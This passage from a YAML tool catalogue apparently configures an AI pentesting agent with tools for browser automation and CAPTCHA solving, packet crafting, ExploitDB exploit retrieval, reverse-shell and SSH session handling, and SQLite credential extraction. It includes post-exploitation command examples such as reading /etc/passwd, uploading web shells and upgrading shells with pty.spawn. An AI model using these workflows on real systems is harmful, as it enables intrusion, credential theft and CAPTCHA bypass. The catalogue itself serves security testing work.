      form filling, and CAPTCHA solving. 27+ methods in 8 categories: navigation (navigate, navigate_back), page state (snapshot
      for element refs, screenshot), interaction (click, hover, type, fill_form, select_option, file_upload, press_key, drag),
      JavaScript (evaluate, run_code), monitoring (network_requests, console_messages), vision mode (mouse_click_xy, mouse_move_xy,
      mouse_drag_xy for coordinate-based CAPTCHA interaction), verification (verify_element_visible, verify_text_visible,
      verify_list_visible, verify_value), evidence (start_tracing, stop_tracing, pdf_save). Chrome headless with VNC access
      at http://localhost:6080/vnc.html for human CAPTCHA solving. Can proxy through ZAP for vulnerability scanning.'
    source: https://github.com/microsoft/playwright-mcp
    image: ghcr.io/silicon-works/mcp-tools-playwright:latest
    image_size_mb: 1500
    capabilities:
    - browser_automation
    - javascript_execution
    - screenshot_capture
    - form_interaction
    - spa_testing
    - captcha_interaction
    - vision_interaction
    - human_captcha_solving
    - vnc_display
    phases:
    - reconnaissance
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 2048
      cpu: 2.0
    see_also:
    - curl
    - zap
    - ffuf
    routing:
      use_for:
      - login form
      - web login
      - fill form
      - web page content
      - JavaScript rendered page
      - browser automation
      - screenshot
      - form interaction
      - web application testing
      - see what's on the page
      - empty response from curl
      - SPA testing
      - session management
      - cookie handling
      - XSS testing
      - XSS validation
      - test payload execution
      - check if JavaScript executes
      - capture console errors
      - payload validation
      - verify XSS callback
      - check cookie exfiltration
      - CAPTCHA
      - captcha solving
      - captcha screenshot
      - image captcha
      - text captcha
      - grid captcha
      - reCAPTCHA
      - slider captcha
      - click captcha images
      never_use_for:
      - simple API request
      - file download
      - exploit payload delivery
      - directory fuzzing
      - brute force
      triggers:
      - login page
      - fill login
      - web form
      - javascript
      - browser
      - screenshot
      - empty body
      - page returns empty
      - captcha
      - CAPTCHA
      prefer_over:
      - curl
    warnings:
    - Large image (~1.5GB) - first pull takes time
    - Requires more memory than curl (2GB recommended)
    notes: 'Wraps Microsoft''s @playwright/mcp npm package in a locally-built container.

      Use for: login forms, JavaScript-rendered content, web app testing.

      Prefer over curl when pages return empty bodies or require JS rendering.


      VNC/noVNC: The browser runs headed on a virtual display with VNC access.

      Users can see and interact with the browser at http://localhost:6080/vnc.html

      This enables human CAPTCHA solving — the agent navigates to the page,

      then the user connects via VNC to solve the CAPTCHA directly.


      WHEN TO USE PLAYWRIGHT vs CURL:

      - Use Playwright: login forms, JS pages, empty curl responses, need to see page

      - Use curl: simple API calls, file downloads, exploit payloads, known endpoints


      PLAYWRIGHT + ZAP INTEGRATION (for JS-heavy security testing):

      Configure proxy via env var: PLAYWRIGHT_MCP_PROXY_SERVER=http://127.0.0.1:8080

      1. Start ZAP - it listens on port 8080

      2. Launch Playwright container with proxy env var set

      3. Use Playwright to browse/interact with target

      4. ZAP captures all traffic via proxy_history

      5. Run zap.active_scan() on captured URLs


      See: https://github.com/microsoft/playwright-mcp

      '
    methods:
      browser_navigate:
        description: Navigate to a URL
        params:
          url:
            type: string
            required: true
            description: URL to navigate to
      browser_navigate_back:
        description: Go back to the previous page
        params: {}
      browser_snapshot:
        description: Capture accessibility snapshot - call this first to get element refs for other tools
        when_to_use: Before interacting with elements - returns refs needed for click/type/etc
        params: {}
      browser_take_screenshot:
        description: Capture visual screenshot of the page or a specific element
        when_to_use: Capture page state, CAPTCHA images, or element-level screenshots for vision analysis
        params:
          filename:
            type: string
            description: Optional filename to save
          element:
            type: string
            description: Human description of element to screenshot
          ref:
            type: string
            description: Element ref from browser_snapshot for element-level screenshot
          fullPage:
            type: boolean
            description: 'Capture full scrollable page (default: viewport only)'
          type:
            type: string
            description: 'Image format: png (default) or jpeg'
      browser_click:
        description: Click on an element using ref from snapshot
        params:
          element:
            type: string
            required: true
            description: Human description for permission
          ref:
            type: string
            required: true
            description: Element ref from browser_snapshot
      browser_hover:
        description: Hover over an element (reveal menus, tooltips)
        params:
          element:
            type: string
            required: true
            description: Human description
          ref:
            type: string
            required: true
            description: Element ref from snapshot
      browser_type:
        description: Type text into an editable element
        params:
          ref:
            type: string
            required: true
            description: Element ref from browser_snapshot
          element:
            type: string
            required: true
            description: Human description for permission
          text:
            type: string
            required: true
            description: Text to type
          submit:
            type: boolean
            description: Press Enter after typing
          slowly:
            type: boolean
            description: Type character by character (triggers key handlers)
      browser_fill_form:
        description: Fill multiple form fields at once
        params:
          fields:
            type: array
            required: true
            description: 'Array of {name, type, ref, value} - type must be: textbox|checkbox|radio|combobox|slider'
      browser_select_option:
        description: Select option from dropdown
        params:
          element:
            type: string
            required: true
          ref:
            type: string
            required: true
          value:
            type: string
            required: true
            description: Option text to select
      browser_file_upload:
        description: Upload files to file input
        params:
          paths:
            type: array
            required: true
            description: File paths to upload
      browser_press_key:
        description: Press a keyboard key (Enter, Tab, Escape, ArrowDown, etc)
        params:
          key:
            type: string
            required: true
            description: Key name like Enter, Tab, Escape
      browser_evaluate:
        description: Execute JavaScript on page or element
        params:
          function:
            type: string
            required: true
            description: JS code as () => {...} or (element) => {...}
          element:
            type: string
            description: Human description if targeting element
          ref:
            type: string
            description: Element ref if targeting specific element
      browser_run_code:
        description: Run arbitrary Playwright code snippet
        params:
          code:
            type: string
            required: true
            description: Playwright code to execute
      browser_handle_dialog:
        description: Handle alert, confirm, or prompt dialogs
        params:
          accept:
            type: boolean
            required: true
            description: Accept or dismiss dialog
          promptText:
            type: string
            description: Text to enter for prompt dialogs
      browser_network_requests:
        description: Get list of network requests made by page
        when_to_use: Discover API endpoints, check for sensitive data in requests
        params: {}
      browser_console_messages:
        description: Get console log messages from page
        when_to_use: Check for JavaScript errors, debug info, leaked secrets
        notes: 'Critical for XSS testing. Captures:

          - console.log() output (use for XSS markers like console.log(''XSS_EXECUTED''))

          - JavaScript errors

          - Network errors

          '
        params: {}
      browser_wait_for:
        description: Wait for text to appear/disappear or timeout
        notes: 'Can wait for text/timeout. For waiting on specific network requests,

          use browser_network_requests with polling or check ZAP proxy_history.

          '
        params:
          text:
            type: string
            description: Text to wait for
          textGone:
            type: string
            description: Text to wait to disappear
          timeout:
            type: integer
            description: Max wait time in ms
      browser_tabs:
        description: List, create, close, or switch browser tabs
        params:
          action:
            type: string
            required: true
            description: list, new, close, or select
          tabId:
            type: string
            description: Tab ID for close/select actions
      browser_resize:
        description: Resize browser window
        params:
          width:
            type: integer
            required: true
          height:
            type: integer
            required: true
      browser_close:
        description: Close the browser page
        params: {}
      browser_drag:
        description: Drag and drop between two elements
        params:
          startElement:
            type: string
            required: true
            description: Human description of source element
          startRef:
            type: string
            required: true
            description: Ref of element to drag from
          endElement:
            type: string
            required: true
            description: Human description of target element
          endRef:
            type: string
            required: true
            description: Ref of element to drop onto
      browser_mouse_click_xy:
        description: Click at exact x,y coordinates on the page (vision mode)
        when_to_use: Click CAPTCHA grid cells, image regions, or elements without accessible refs
        params:
          x:
            type: integer
            required: true
            description: X coordinate in pixels
          y:
            type: integer
            required: true
            description: Y coordinate in pixels
          button:
            type: string
            description: 'Mouse button: left (default), right, middle'
      browser_mouse_move_xy:
        description: Move mouse to exact x,y coordinates (vision mode)
        when_to_use: Hover over CAPTCHA elements, position cursor before clicking
        params:
          x:
            type: integer
            required: true
            description: X coordinate in pixels
          y:
            type: integer
            required: true
            description: Y coordinate in pixels
      browser_mouse_drag_xy:
        description: Drag from one x,y coordinate to another (vision mode)
        when_to_use: Solve slider CAPTCHAs, drag-and-drop puzzles
        params:
          startX:
            type: integer
            required: true
            description: Start X coordinate
          startY:
            type: integer
            required: true
            description: Start Y coordinate
          endX:
            type: integer
            required: true
            description: End X coordinate
          endY:
            type: integer
            required: true
            description: End Y coordinate
      browser_install:
        description: Install browser if not present (usually not needed - Chrome pre-installed)
        params: {}
      browser_verify_element_visible:
        description: Verify an element is visible on the page
        when_to_use: Confirm payload rendered or element appeared after action
        params:
          ref:
            type: string
            required: true
            description: Element ref from browser_snapshot
          timeout:
            type: integer
            description: Max wait time in ms
      browser_verify_text_visible:
        description: Verify specific text is visible on the page
        when_to_use: Check XSS output appeared, verify payload execution result
        params:
          text:
            type: string
            required: true
            description: Text to verify is visible
          timeout:
            type: integer
            description: Max wait time in ms
      browser_verify_list_visible:
        description: Verify a list of items is visible
        when_to_use: Enumerate visible data, check multiple payloads rendered
        params:
          items:
            type: array
            required: true
            description: List of text items to verify
          timeout:
            type: integer
            description: Max wait time in ms
      browser_verify_value:
        description: Verify form field has specific value
        when_to_use: Check form state after injection, verify pre-filled values
        params:
          ref:
            type: string
            required: true
            description: Element ref from browser_snapshot
          value:
            type: string
            required: true
            description: Expected value
      browser_start_tracing:
        description: Start recording browser execution trace
        when_to_use: Capture full execution evidence for XSS, record all network activity
        params:
          name:
            type: string
            description: Optional trace name
      browser_stop_tracing:
        description: Stop recording and save trace file
        when_to_use: Save evidence after completing XSS test or interaction sequence
        params:
          path:
            type: string
            description: Path to save trace file
      browser_pdf_save:
        description: Save current page as PDF
        when_to_use: Capture page state as evidence, save rendered payload result
        params:
          path:
            type: string
            description: Path to save PDF file
          fullPage:
            type: boolean
            description: Capture full scrollable page
  scapy:
    name: scapy
    version: '2.5'
    description: 'Packet crafting and low-level network testing via Scapy 2.5. 8 methods: udp_send (send/receive UDP packets),
      udp_probe (UDP service discovery with protocol-specific probes), tcp_syn (SYN scan single port), icmp_ping (ICMP echo),
      dns_query (DNS lookups with A/AAAA/MX/NS/TXT/SOA/ANY types), craft_packet (custom TCP/UDP/ICMP with hex payloads and
      TCP flags), arp_scan (local network host discovery with MAC addresses), snmp_get (SNMP community string testing). Requires
      NET_RAW and NET_ADMIN capabilities for raw socket access.'
    image: ghcr.io/silicon-works/mcp-tools-scapy:latest
    image_size_mb: 200
    capabilities:
    - packet_crafting
    - udp_testing
    - protocol_manipulation
    - raw_sockets
    - arp_scanning
    - dns_queries
    - snmp_testing
    routing:
      use_for:
      - send and receive UDP packets for protocol testing and service interaction
      - probe UDP ports with service-specific payloads for service discovery
      - craft custom TCP UDP or ICMP packets with specific flags and hex payloads
      - ARP scan local network to discover hosts and MAC addresses
      - DNS query with specific record types (A, MX, NS, TXT, SOA, ANY)
      - test SNMP community strings against target devices
      - protocol fuzzing with raw socket packet crafting
      - single-port TCP SYN check when full nmap scan is overkill
      never_use_for:
      - HTTP requests (use curl)
      - port scanning (use nmap)
      triggers:
      - UDP
      - packet craft
      - raw socket
      - ARP scan
      - SNMP
      - DNS query
      - protocol fuzz
      - scapy
      prefer_over:
      - netcat for UDP
    phases:
    - reconnaissance
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: true
      privileged_reason: Requires raw sockets (NET_RAW, NET_ADMIN) for packet crafting and ARP operations
      capabilities:
      - NET_RAW
      - NET_ADMIN
    resources:
      memory_mb: 256
      cpu: 0.5
    methods:
      udp_send:
        description: Send a UDP packet and receive response
        when_to_use: For UDP protocol testing, service interaction, or custom payloads
        params:
          target:
            type: string
            required: true
            description: Target IP address
          port:
            type: integer
            required: true
            description: Target UDP port
          data:
            type: string
            required: true
            description: Payload data (string or hex with 0x prefix)
          sport:
            type: integer
            default: 0
            description: Source port (0 = random)
          timeout:
            type: integer
            default: 5
            description: Response timeout in seconds
        returns:
          received:
            type: boolean
            description: Whether response was received
          payload_hex:
            type: string
            description: Response payload as hex
          payload_ascii:
            type: string
            description: Response payload as ASCII
      udp_probe:
        description: Probe UDP ports to discover services
        when_to_use: For UDP service discovery when nmap UDP scan is insufficient
        params:
          target:
            type: string
            required: true
            description: Target IP
          ports:
            type: string
            required: true
            description: Ports to probe (comma-separated or range)
          probe_data:
            type: string
            default: ''
            description: Custom probe data (empty for service-specific defaults)
          timeout:
            type: integer
            default: 3
            description: Timeout per probe
        returns:
          results:
            type: array
            description: Per-port probe results
          open_ports:
            type: array
            description: Potentially open ports
      tcp_syn:
        description: Send TCP SYN packet for custom port probing
        when_to_use: For stealthy single-port checks or custom TCP testing
        params:
          target:
            type: string
            required: true
            description: Target IP
          port:
            type: integer
            required: true
            description: Target port
          timeout:
            type: integer
            default: 3
            description: Response timeout
        returns:
          state:
            type: string
            description: Port state (open, closed, filtered)
          response:
            type: object
            description: Response packet summary
      icmp_ping:
        description: Send ICMP echo request
        when_to_use: For host discovery when regular ping is blocked
        params:
          target:
            type: string
            required: true
            description: Target IP
          count:
            type: integer
            default: 1
            description: Number of pings
          timeout:
            type: integer
            default: 3
            description: Response timeout
        returns:
          received:
            type: integer
            description: Number of responses
          loss_percent:
            type: number
            description: Packet loss percentage
      dns_query:
        description: Send DNS query to a server
        when_to_use: For DNS enumeration, zone transfer testing, or custom DNS queries
        params:
          server:
            type: string
            required: true
            description: DNS server IP
          domain:
            type: string
            required: true
            description: Domain to query
          query_type:
            type: string
            enum:
            - A
            - AAAA
            - MX
            - NS
            - TXT
            - SOA
            - CNAME
            - PTR
            - ANY
            default: A
            description: DNS query type
          timeout:
            type: integer
            default: 5
            description: Response timeout
        returns:
          answers:
            type: array
            description: DNS answers
          answer_count:
            type: integer
            description: Number of answers
      craft_packet:
        description: Craft and send a custom packet
        when_to_use: For protocol testing, fuzzing, or when no specialized tool exists
        params:
          target:
            type: string
            required: true
            description: Target IP
          protocol:
            type: string
            enum:
            - tcp
            - udp
            - icmp
            required: true
            description: Protocol layer
          port:
            type: integer
            description: Destination port (for TCP/UDP)
          flags:
            type: string
            default: S
            description: TCP flags (S=SYN, A=ACK, F=FIN, R=RST, P=PSH, U=URG)
          payload_hex:
            type: string
            description: Payload as hex string
          payload_ascii:
            type: string
            description: Payload as ASCII string
          timeout:
            type: integer
            default: 5
            description: Response timeout
        returns:
          response:
            type: object
            description: Response packet summary
      arp_scan:
        description: Perform ARP scan on local network
        when_to_use: For local network host discovery
        params:
          network:
            type: string
            required: true
            description: Network range (e.g., 192.168.1.0/24)
          timeout:
            type: integer
            default: 3
            description: Response timeout
        returns:
          hosts:
            type: array
            description: Discovered hosts with IP and MAC
          host_count:
            type: integer
            description: Number of hosts found
      snmp_get:
        description: Send SNMP GET request for community string testing
        when_to_use: To test SNMP community strings
        params:
          target:
            type: string
            required: true
            description: Target IP
          community:
            type: string
            default: public
            description: SNMP community string to test
          oid:
            type: string
            default: 1.3.6.1.2.1.1.1.0
            description: OID to query
          port:
            type: integer
            default: 161
            description: SNMP port
          timeout:
            type: integer
            default: 5
            description: Response timeout
        returns:
          valid_community:
            type: boolean
            description: Whether community string is valid
          response:
            type: string
            description: SNMP response data
  searchsploit:
    name: searchsploit
    version: latest
    description: Offline search of the Exploit Database (exploit-db.com) using the searchsploit CLI. Contains 45,000+ public
      exploits, shellcodes, and security papers indexed locally — no network required. Searches exploit titles and file paths
      with fuzzy version range matching (e.g., '2.4' matches '2.0 < 2.5'). Supports JSON output parsing, CVE-based search
      (--cve), exact matching, and full exploit source code retrieval. Exploit code is stored at /usr/share/exploitdb/exploits/.
      Includes the full ExploitDB mirror.
    image: ghcr.io/silicon-works/mcp-tools-searchsploit:latest
    image_size_mb: 500
    capabilities:
    - exploit_search
    - vulnerability_research
    phases:
    - exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    routing:
      use_for:
      - find public exploits for a software version or CVE
      - search ExploitDB for known vulnerabilities
      - find exploit code for Apache Nginx WordPress Drupal
      - search for privilege escalation exploits by kernel version
      - look up CVE exploit availability
      - find remote code execution exploits for identified services
      - retrieve exploit source code by EDB-ID
      - check if a service version has known exploits
      triggers:
      - CVE-\d{4}-\d+
      - exploit.*search
      - searchsploit
      - exploitdb
      - find exploit
      - known exploit
      never_use_for:
      - writing custom exploits (use exploit-runner)
      - payload generation (use payload tool)
      - active vulnerability scanning (use nuclei or nmap vuln)
    methods:
      search:
        description: Search the local ExploitDB mirror (45,000+ entries) for exploits matching query terms. Uses searchsploit
          with --json output. By default, performs case-insensitive AND matching across all terms with fuzzy version range
          detection (e.g., searching '2.4' will match entries for '2.0 < 2.5'). Parses JSON output into structured results
          with EDB-ID, title, path, date, and type (exploit/shellcode/paper). Search terms are split on spaces and matched
          independently — word order doesn't matter.
        when_to_use: 'After service_scan identifies service versions (e.g., ''Apache httpd 2.4.49'', ''OpenSSH 7.2p2'', ''ProFTPD
          1.3.5''). The standard workflow is: nmap service_scan → searchsploit with the product and version. Search tips:
          (1) Use product name + version: ''apache 2.4.49'', not ''Apache httpd 2.4.49 Ubuntu''. (2) Start broad, then narrow:
          first ''apache 2.4'', then ''apache 2.4.49'' if too many results. (3) For Windows: search by MS bulletin ''ms17-010''
          or KB number. (4) For kernels: ''linux kernel 5.4'' or ''linux privilege escalation''. (5) Use exact=true for precise
          version matching when fuzzy results are too broad. (6) Filter by type=''exploit'' to exclude papers and shellcodes.
          After finding relevant results, use get_exploit to retrieve the exploit source code.'
        params:
          query:
            type: string
            description: 'Space-separated search terms. Each term must appear in the exploit title or path. Examples: ''apache
              2.4.49'' (product + version), ''wordpress 5.0'' (CMS + version), ''linux kernel 5.4 privilege'' (kernel + version
              + type), ''ms17-010'' (MS bulletin), ''eternalblue'' (exploit name), ''ssh'' (service). Fewer, more specific
              terms give better results. Mutually exclusive with cve.'
          cve:
            type: string
            description: Search by CVE ID (e.g., '2021-44228' for Log4Shell, '2021-41773' for Apache path traversal). Omit
              the 'CVE-' prefix. More precise than free-text search because it searches the CVE field specifically. Mutually
              exclusive with query.
          exact:
            type: boolean
            default: false
            description: Exact order match on exploit title (searchsploit --exact). With exact=false (default), terms are
              matched independently in any order with fuzzy version ranges. With exact=true, the query string must appear
              exactly as-is in the title. Use exact=true when default search returns too many irrelevant results. Only applies
              to text search (query), not CVE search.
          type:
            type: enum
            values:
            - all
            - exploit
            - shellcode
            - paper
            default: all
            description: Filter by result type. 'exploit' = working exploit code (Python, C, Ruby, etc.), 'shellcode' = standalone
              shellcode (assembly, machine code), 'paper' = writeups and advisories (no exploit code). Use 'exploit' for actionable
              results. Only applies to text search (query), not CVE search.
          strict:
            type: boolean
            default: false
            description: Strict version matching — '1.1' only matches '1.1', not '1.0 < 1.3'. Use when the default fuzzy matching
              returns too many irrelevant version results. Only applies to text search (query), not CVE search.
          exclude:
            type: string
            description: 'Exclude results matching these terms (pipe-separated). Examples: ''(PoC)|/dos/'' (exclude proof-of-concepts
              and DoS), ''/windows/'' (exclude Windows exploits), ''/linux/'' (exclude Linux exploits). Useful for filtering
              out irrelevant platforms or non-functional PoCs. Only applies to text search (query), not CVE search.'
        returns:
          results:
            type: array
            description: 'Matching entries, each with: id (EDB-ID number), title (exploit description), path (local file path
              under /usr/share/exploitdb/), date (publication date), type (''exploit'', ''shellcode'', or ''paper'')'
          count:
            type: integer
            description: Number of matching results
          query:
            type: string
            description: The search query or CVE ID that was used
          search_type:
            type: string
            description: '''text'' for query-based search, ''cve'' for CVE-based search'
      get_exploit:
        description: Retrieve the full source code of an exploit by its EDB-ID number or file path. Resolves the exploit ID
          to a local file path (/usr/share/exploitdb/exploits/...) via JSON search, then reads the file. Exploit code can
          be Python, C, Ruby, PHP, Perl, shell script, or text. The full content is returned for review before use.
        when_to_use: 'After search identifies a relevant exploit, use this to retrieve its source code. Review the code to
          understand: (1) what it does, (2) what parameters it needs (target IP, port, paths), (3) whether it needs compilation
          or modification, (4) any dependencies. For Python exploits: may need to be adapted and run via exploit-runner. For
          C exploits: need compilation (gcc). For Metasploit modules (Ruby): use the metasploit tool instead. Always review
          exploit code before execution — public exploits may contain backdoors or be unreliable.'
        params:
          exploit_id:
            type: string
            required: true
            description: Either the EDB-ID number (e.g., '50383', '39446') from search results, or the full file path (e.g.,
              '/usr/share/exploitdb/exploits/linux/remote/50383.py'). EDB-ID is preferred — the tool resolves it to the full
              path automatically.
        returns:
          exploit_id:
            type: string
            description: The exploit ID that was requested
          path:
            type: string
            description: Full local path to the exploit file
          content:
            type: string
            description: Complete exploit source code as text
      mirror:
        description: Copy an exploit file to the session working directory for modification. Resolves the EDB-ID to a local
          file path, then copies the exploit source to the current working directory. Useful when you need to modify exploit
          code before execution — e.g., changing hardcoded IPs, adjusting payloads, or adapting the exploit for the target
          environment.
        when_to_use: 'After reviewing an exploit with get_exploit and determining it needs modification before use. Common
          modifications: (1) changing target IP/port, (2) adjusting payload (reverse shell callback IP), (3) adding missing
          dependencies or imports, (4) fixing Python 2 vs 3 compatibility issues, (5) adapting for the specific target version.
          After mirroring, the exploit can be edited and run via exploit-runner.'
        params:
          exploit_id:
            type: string
            required: true
            description: EDB-ID of the exploit to copy (e.g., '50383' from search results). The exploit file will be copied
              to the current working directory with its original filename.
        returns:
          exploit_id:
            type: string
            description: The exploit ID that was copied
          source_path:
            type: string
            description: Original file path in the ExploitDB mirror
          filename:
            type: string
            description: Name of the copied file in the working directory
  shell-session:
    name: shell-session
    version: '1.0'
    description: 'Persistent shell session manager (paramiko for SSH, raw sockets for reverse shells) for maintaining interactive
      sessions on compromised targets. Unlike the ssh tool (which reconnects per command), shell-session keeps a single SSH
      connection open for multiple commands via exec. 9 methods: ssh_connect (persistent SSH via paramiko), exec (run command
      on SSH session), upload/download (SFTP file transfer), listen (reverse shell TCP listener), shell_exec (send command
      to reverse shell with output stability detection), list_sessions, close, upgrade_shell (dumb shell to PTY via python3
      pty.spawn). Supports password and base64-encoded private key authentication. Multiple concurrent sessions identified
      by session_id.'
    image: ghcr.io/silicon-works/mcp-tools-shell-session:latest
    image_size_mb: 150
    capabilities:
    - persistent_shell_sessions
    - ssh_session_management
    - reverse_shell_handling
    - file_transfer
    - command_execution
    routing:
      use_for:
      - maintain persistent SSH session for multiple commands on target
      - interact with reverse shell connection
      - upload and download files via SFTP on persistent session
      - post-exploitation enumeration with many sequential commands
      - upgrade dumb reverse shell to interactive PTY
      - manage multiple concurrent sessions across targets
      never_use_for:
      - initial SSH connection test (use ssh exec)
      - single one-off command execution (use ssh exec)
      - SSH tunneling or port forwarding (use tunnel)
      triggers:
      - persistent shell
      - reverse shell session
      - interactive shell
      - multiple commands on target
      - shell session
      - upgrade shell
      - SFTP transfer
      prefer_over:
      - ssh
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    methods:
      ssh_connect:
        description: Establish a persistent SSH session to a target using paramiko. The connection stays open until close()
          is called or the server disconnects. Supports password and base64-encoded private key authentication. Returns a
          session_id for use with exec, upload, download.
        when_to_use: 'When you have valid SSH credentials and plan to run many commands — avoids the reconnection overhead
          of the ssh tool''s per-command model. Typical post-exploitation workflow: ssh_connect → exec(''id'') → exec(''cat
          /etc/passwd'') → upload(linpeas.sh) → exec(''./linpeas.sh'') → download(''/root/root.txt''). Use the ssh tool instead
          for single one-off commands.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          port:
            type: integer
            default: 22
            description: SSH port.
          username:
            type: string
            required: true
            description: SSH username.
          password:
            type: string
            description: SSH password. Provide either password or private_key.
          private_key:
            type: string
            description: Base64-encoded SSH private key. Decoded and loaded by paramiko.
          timeout:
            type: integer
            default: 30
            description: Connection timeout in seconds.
        returns:
          session_id:
            type: string
            description: Session ID for exec, upload, download, and close.
          banner:
            type: string
            description: SSH server banner (if available).
      exec:
        description: Execute a command on an established SSH session. Uses paramiko's exec_command (or invoke_shell with get_pty=true
          for interactive commands like sudo). Returns stdout, stderr, and exit code. The session remains open for more commands.
        when_to_use: For running commands on a persistent SSH session. Use get_pty=true for commands that need a terminal
          (sudo, su, interactive prompts). For commands that produce large output (linpeas, find), increase timeout.
        params:
          session_id:
            type: string
            required: true
            description: Session ID from ssh_connect.
          command:
            type: string
            required: true
            description: Shell command to execute.
          timeout:
            type: integer
            default: 120
            description: Command execution timeout in seconds.
          get_pty:
            type: boolean
            default: false
            description: Request a pseudo-terminal. Required for sudo, su, and other interactive commands.
        returns:
          stdout:
            type: string
            description: Command standard output.
          stderr:
            type: string
            description: Command standard error.
          exit_code:
            type: integer
            description: Command exit code.
      upload:
        description: Upload a file to the target via SFTP on an existing SSH session. Supports text content or base64-encoded
          binary. Sets file permissions (default 0755 for executables).
        when_to_use: To upload enumeration scripts (linpeas, pspy), compiled exploits, or web shells to the target. Faster
          than ssh copy_to because it reuses the existing connection. Set mode='0644' for non-executable files.
        params:
          session_id:
            type: string
            required: true
            description: Session ID from ssh_connect.
          content:
            type: string
            required: true
            description: File content (plain text or base64-encoded binary).
          remote_path:
            type: string
            required: true
            description: Destination path on target (e.g., '/tmp/linpeas.sh').
          mode:
            type: string
            default: '0755'
            description: File permissions in octal (e.g., '0755' for executable, '0644' for read-only).
          is_base64:
            type: boolean
            default: false
            description: Set true if content is base64-encoded (for binary files).
        returns:
          size:
            type: integer
            description: Uploaded file size in bytes.
      download:
        description: Download a file from the target via SFTP on an existing SSH session. Returns content as text or base64.
        when_to_use: 'To retrieve files from the target: flags (user.txt, root.txt), configs, SSH keys, database files. Use
          as_base64=true for binary files.'
        params:
          session_id:
            type: string
            required: true
            description: Session ID from ssh_connect.
          remote_path:
            type: string
            required: true
            description: Absolute path to file on target.
          as_base64:
            type: boolean
            default: false
            description: Return content as base64 (for binary files).
        returns:
          content:
            type: string
            description: File content (text or base64).
          size:
            type: integer
            description: File size in bytes.
      listen:
        description: Start a TCP listener for catching reverse shell connections. Blocks until a connection is received or
          timeout expires. The connected shell becomes a session accessible via shell_exec.
        when_to_use: 'Alternative to netcat listen for reverse shells. The advantage is that the session integrates directly
          with shell_exec for command execution and upgrade_shell for PTY upgrade — no separate listener_read/listener_write
          needed. Workflow: listen(port=4444) → trigger reverse shell → shell_exec(''id'') → upgrade_shell() → shell_exec(''sudo
          -l'').'
        params:
          port:
            type: integer
            required: true
            description: Port to listen on (>1024 for non-privileged).
          timeout:
            type: integer
            default: 300
            description: Timeout waiting for a connection in seconds.
        returns:
          session_id:
            type: string
            description: Session ID for shell_exec and upgrade_shell.
          remote_ip:
            type: string
            description: IP address of the connecting target.
      shell_exec:
        description: Execute a command on a reverse shell session with output stability detection. Sends the command, waits
          for output to stabilize (no new data for a period), then returns all collected output. More reliable than raw socket
          read/write.
        when_to_use: For running commands on a reverse shell session created via listen. The stability detection handles commands
          with varying output speeds. For interactive commands (sudo), upgrade_shell first.
        params:
          session_id:
            type: string
            required: true
            description: Session ID from listen.
          command:
            type: string
            required: true
            description: Command to execute on the reverse shell.
          timeout:
            type: integer
            default: 60
            description: Command timeout in seconds.
        returns:
          output:
            type: string
            description: Command output (stdout + stderr combined).
      list_sessions:
        description: List all active sessions (SSH and reverse shell) with their type, host, status, and creation time.
        when_to_use: To check which sessions are active, find a session_id you forgot, or verify a session is still connected.
        params: {}
        returns:
          sessions:
            type: array
            description: 'Active sessions with: id, type (ssh/shell), host, status, created_at.'
      close:
        description: Close a session gracefully. For SSH sessions, disconnects the paramiko client. For reverse shells, closes
          the socket.
        when_to_use: When done with a target — always close sessions to free resources and avoid stale connections.
        params:
          session_id:
            type: string
            required: true
            description: Session ID to close.
        returns:
          success:
            type: boolean
            description: Whether the session was closed successfully.
      upgrade_shell:
        description: Upgrade a dumb reverse shell to a fully interactive PTY by sending 'python3 -c "import pty;pty.spawn("/bin/bash")"'.
          Enables features like sudo, su, tab completion, and arrow keys that don't work in raw shells.
        when_to_use: After catching a reverse shell via listen, before running interactive commands like sudo or su. The upgrade
          enables PTY features needed by many privilege escalation techniques. Only works if python3 is available on the target.
        params:
          session_id:
            type: string
            required: true
            description: Reverse shell session ID from listen.
        returns:
          success:
            type: boolean
            description: Whether the shell was upgraded to PTY.
  sqlite:
    name: sqlite
    version: '1.0'
    description: 'SQLite database client (v3.46.1 with FTS5) for post-exploitation extraction of data from .db and .sqlite
      files. Accepts database files by path (mounted volume) or base64-encoded content (downloaded from target via ssh/shell-session).
      Includes automated credential hunting that pattern-matches table names (users, accounts, admin, login, members, employees)
      and column names (password, hash, token, api_key, secret) to extract username/password pairs. Common targets: WordPress/Drupal
      user databases, Firefox/Chrome stored credentials and history, mobile app databases, application config stores, session
      databases, and any web framework using SQLite as backend.'
    image: ghcr.io/silicon-works/mcp-tools-sqlite:latest
    image_size_mb: 100
    capabilities:
    - database_extraction
    - credential_extraction
    - data_analysis
    phases:
    - post-exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - SQLite database extraction and analysis
      - extract credentials usernames passwords hashes from SQLite database
      - analyze downloaded .db .sqlite database file from target
      - post-exploitation database enumeration and data extraction
      - browser data extraction Firefox Chrome history passwords bookmarks cookies
      - CMS database analysis WordPress Drupal user tables
      - application config and secret extraction from SQLite
      - enumerate database schema tables columns row counts
      - execute SQL queries on local SQLite database file
      - mobile app database analysis Android iOS SQLite
      never_use_for:
      - remote database access (use mysql or mongodb)
      - SQL injection (use sqlmap)
      - port scanning
      triggers:
      - SQLite
      - .db file
      - .sqlite
      - database file
      - local database
      - extract from database
    methods:
      query:
        description: Execute an arbitrary SQL query on a SQLite database and return structured results. Supports any valid
          SQLite SQL including SELECT, PRAGMA, and aggregate functions. Automatically appends LIMIT to SELECT queries that
          don't already have one to prevent memory exhaustion on large tables. Returns column names and rows as dictionaries
          for easy parsing.
        when_to_use: 'When you need to run a specific SQL query that isn''t covered by the other convenience methods (list_tables,
          describe_table, dump_table, find_credentials). Use for: custom JOINs across tables, aggregate queries (COUNT, GROUP
          BY), LIKE/GLOB pattern searches for specific data, PRAGMA commands for database metadata, or any complex query.
          Also use when you need to search for specific values (e.g., SELECT * FROM users WHERE role=''admin'').'
        params:
          database:
            type: string
            required: true
            description: 'Path to SQLite database file inside the container (e.g., ''/data/app.db'' if volume-mounted), OR
              base64-encoded database content if is_base64=true. For databases downloaded from target, use base64 encoding:
              first download via ssh.download or shell-session, then pass the base64 content here.'
          query:
            type: string
            required: true
